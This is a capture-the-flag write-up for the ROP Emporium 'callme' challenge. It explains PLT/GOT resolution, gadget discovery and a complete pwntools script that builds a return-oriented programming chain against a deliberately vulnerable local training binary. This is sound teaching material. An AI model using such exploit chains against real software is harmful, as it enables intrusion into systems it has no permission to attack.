# Callme


## Understanding

[This approach](https://ropemporium.com/guide.html#Appendix%20A) from the challenges site might help you understand part of this challenge.

In this challenge, we try to call three different functions that are dynamically linked using (GOT PLT) by redirecting the execution to the plt symbol of the functions with passing three arguments for each function.

## Objective

1. find pattern length (same as first [challenge](https://github.com/l0x539/CTFs-writeups/tree/master/ropemporium/ret2win)).
2. find the three functions plt symbols.
3. find the gadgets/gadget to load the function arguments.
4. chain the ropes.
5. exploit.

## Understanding GOT PLT

In general calling a function from a different dynamically linked file in linux happens using this method PLT (Procedure Linkage Table) and GOT (Global Offsets Table).

in our case we got two files, first one is `callme` which is our binary file and the second one is `libcallme.so` which is the dynamically linked library.

`callme_one`, `callme_two` and `callme_three` are inside `libcallme.so`.

each one of these functions are called by `callme` beside other functions. we can check the functions that `callme` uses from `libcallme.so` by using the command `$ radbin2 -i callme` (basically those are the imported functions).

* example:

```c
int main() {
	function(); // calling function first time
	function(); // calling function second time
	...
	function(); // calling function x time
}
```

first time you call a dynamically linked function `function();`, it happens like this:
`call function@plt ==> reolve_function ==> function_outside_our_binary`

if you call the function again.
`call function@plt ==> function_outside_our_binary`

`function_outside_our_binary` is the function called from the dynamically linked library (file, in our case `libcallme.so`), usually it's `_function` example: `_system` or `_puts`, but `callme_*` stays is the same insteam of `_callme_*` (just a function name).

the reason it resolves the address the first time is that the address in the linked library is not known during linkage.

## Recon

Same as first [challenge](https://github.com/l0x539/CTFs-writeups/tree/master/ropemporium/ret2win).

Running `$ rabin2 -i callme` can show you the imported functions.

## Execution

* Using gdb to examine we need:

- Note:
in this tutorial we'll be using `pwntools` more to get addresses instead of gdb.

1. finding the addresses of `callme_one`, `callme_two` and `callme_three`:

you'll notice `usefulFunction` which makes calls to the three functions but not in the right order.

```
gef➤  disass usefulFunction 
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:     push   rbp
   0x00000000004008f3 <+1>:     mov    rbp,rsp
   0x00000000004008f6 <+4>:     mov    edx,0x6
   0x00000000004008fb <+9>:     mov    esi,0x5
   0x0000000000400900 <+14>:    mov    edi,0x4
   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:    mov    edx,0x6
   0x000000000040090f <+29>:    mov    esi,0x5
   0x0000000000400914 <+34>:    mov    edi,0x4
   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:    mov    edx,0x6
   0x0000000000400923 <+49>:    mov    esi,0x5
   0x0000000000400928 <+54>:    mov    edi,0x4
   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:    mov    edi,0x1
   0x0000000000400937 <+69>:    call   0x400750 <exit@plt>
End of assembler dump.
```

in the challenge description it mentions:
![Callme Description](https://raw.githubusercontent.com/l0x539/CTFs-writeups/master/ropemporium/callme/callme1.png)

so order does matter, thus, redirecting execution to `usefulFunction` is indeed useless

we need the addresses from the plt table, thus in gdb we can check how `callme_*` is called, or simply do `callme_*@plt`.
`*` here is `one` or `two` or `three`

we can get the plt addresses from usefulFunctio:
```
   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
   ...
   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt> 
   ...
   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
```
or 
```
gef➤  print 'callme_one@plt'
$3 = {<text variable, no debug info>} 0x400720 <callme_one@plt>
gef➤  print 'callme_two@plt'
$4 = {<text variable, no debug info>} 0x400740 <callme_two@plt>
gef➤  print 'callme_three@plt'
$5 = {<text variable, no debug info>} 0x4006f0 <callme_three@plt>
```

so the addresses are:

`callme_one_plt   = 0x400720`
`callme_two_plt   = 0x400740`
`callme_three_plt = 0x4006f0`


2. finding the gadgets to load arguments.

We already knew that `rdi` is the first argument from the [previous challenge](https://github.com/l0x539/CTFs-writeups/tree/master/ropemporium/split)

let's see how the arguments are managed inside `callme_one` function.

running `disass callme_one` and examine the code shows how the function handles the arguments, we notice:

```
   ...
   0x00007fbd1ec20822 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00007fbd1ec20826 <+12>:    mov    QWORD PTR [rbp-0x20],rsi
   0x00007fbd1ec2082a <+16>:    mov    QWORD PTR [rbp-0x28],rdx
   0x00007fbd1ec2082e <+20>:    movabs rax,0xdeadbeefdeadbeef
   0x00007fbd1ec20838 <+30>:    cmp    QWORD PTR [rbp-0x18],rax
   0x00007fbd1ec2083c <+34>:    jne    0x7fbd1ec20912 <callme_one+248>
   0x00007fbd1ec20842 <+40>:    movabs rax,0xcafebabecafebabe
   0x00007fbd1ec2084c <+50>:    cmp    QWORD PTR [rbp-0x20],rax
   0x00007fbd1ec20850 <+54>:    jne    0x7fbd1ec20912 <callme_one+248>
   0x00007fbd1ec20856 <+60>:    movabs rax,0xd00df00dd00df00d
   0x00007fbd1ec20860 <+70>:    cmp    QWORD PTR [rbp-0x28],rax
   0x00007fbd1ec20864 <+74>:    jne    0x7fbd1ec20912 <callme_one+248>
   ...

```

first three instructions are loading the arguments `rdi`, `rsi`, `rdx` respectively, then we notice that it's comparing those arguments to `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d` respectively, and making a Jump not equal condition (jne), in a `c` code it would look like:

```c
	var_1 = arg_1;  // [rbp-0x18] = rdi
	var_2 = arg_2;  // [rbp-0x20] = rsi
	var_3 = arg_3;  // [rbp-0x28] = rdx

	if (var_1 == 0xdeadbeefdeadbeef){
		if (var_2 == 0xcafebabecafebabe) {
			if (var_3 == 0xd00df00dd00df00d) {
				/* execute {open encrypted_flag in callme_one,
				 * open key1.dat in callme_two,
				 * open key2.dat in callme_three} 
				 * and the decrypting the file and printing it. */
			}
		}
	}
```

so the gadgets we need are, `pop rdi`, `pop rsi` and `pop rdx`

using `radare2` we can find the Gadget, in our case we only find one that was enough.

```
[0x00400760]> /R pop rdi
  0x0040093c                 5f  pop rdi
  0x0040093d                 5e  pop rsi
  0x0040093e                 5a  pop rdx
  0x0040093f                 c3  ret
```

the gadget address is `0x0040093c`
so:
`pop_rdi_rsi_rdx_ret = 0x0040093c`

final payload will look like:

`Pattern + pop_rdi_rsi_rdx_ret + arg_1 (0xdeadbeefdeadbeef) + arg_2 (0xcafebabecafebabe) + arg_3 (0xd00df00dd00df00d) + callme_one_plt + pop_rdi_rsi_rdx_ret + arg_1 (0xdeadbeefdeadbeef) + arg_2 (0xcafebabecafebabe) + arg_3 (0xd00df00dd00df00d) + callme_two_plt + pop_rdi_rsi_rdx_ret + arg_1 (0xdeadbeefdeadbeef) + arg_2 (0xcafebabecafebabe) + arg_3 (0xd00df00dd00df00d) + callme_three_plt`

we can do:
```
args = arg_1 (0xdeadbeefdeadbeef) + arg_2 (0xcafebabecafebabe) + arg_3 (0xd00df00dd00df00d)
payload = Pattern + pop_rdi_rsi_rdx_ret + args + callme_one_plt + pop_rdi_rsi_rdx_ret + args + callme_two_plt + pop_rdi_rsi_rdx_ret + args + callme_three_plt
```

Now let's exploit.

## Writing exploit

in a file called [exploit.py]()

again, using [pwntools](http://docs.pwntools.com/en/stable/) on python3.

* Imports:

```python3
from pwn import cyclic, p64, process, ELF, ROP
```

* Running file

```python3
_FILE = "./callme"
p = process(_FILE)
```

* Loading binary file to get addresses:

```python3
binary = ELF(_FILE)
```

* using ROP class from pwntools

```python3
rop = ROP(binary)

pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0] # or 0x0040093c
# or
'''
pop_rdi_rsi_rdx_ret = 0x0040093c
'''
```
* preventing repetition:

```python3
# passing parameters
pass_params =  p64(pop_rdi_rsi_rdx_ret) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
```

* Crafting payload

```python3
# crafting payload
payload = cyclic(40, n=8)
# calling callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += pass_params
payload += p64(binary.plt['callme_one'])
# calling callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) 
payload += pass_params
payload += p64(binary.plt['callme_two'])
# calling callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) 
payload += pass_params
payload += p64(binary.plt['callme_three'])
```

* Receiving output until it asks for input:

```python3
print(p.recvuntil("> ").decode("latin-1"))

* Sending payload

```python3
p.sendline(payload)
```

* Receving output:

```python3
print(p.clean().decode("latin-1"))
```

* Running the script:

```
$ python3 exploit.py 
[+] Starting local process './callme': pid 25240
[*] '/home/kali/CTFs-writeups/ropemporium/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 17 cached gadgets for './callme'
callme by ROP Emporium
x86_64

Hope you read the instructions...

> 
[*] Process './callme' stopped with exit code 0 (pid 25240)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}

```

And we get the flag!
